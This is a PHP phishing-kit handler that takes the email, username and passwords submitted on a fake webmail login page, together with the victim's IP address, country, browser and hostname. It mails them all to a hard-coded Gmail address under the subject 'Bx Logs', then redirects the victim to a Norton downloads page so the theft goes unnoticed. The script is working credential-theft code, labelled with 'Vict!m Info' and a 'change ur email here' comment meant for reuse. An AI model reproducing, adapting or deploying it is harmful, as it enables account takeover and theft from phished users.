<?
$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message .= "--------------Webmail Info-----------------------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Domain\User Name: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Confirm Password: ".$_POST['conpassword']."\n";
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Browser: ".$browserAgent."\n";
$message .= "DateTime: ".$timedate."\n";
$message .= "Country: ".$country."\n";
$message .= "HostName : ".$hostname."\n";
$message .= "---------------Created BY S|L-------------\n";
//change ur email here
$send = "unsandradalwin@gmail.com";
$subject = "Bx Logs";
$headers = "From: S|L<unsandradalwin@gmail.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);

 }
    header("Location: https://us.norton.com/downloads");
  

?>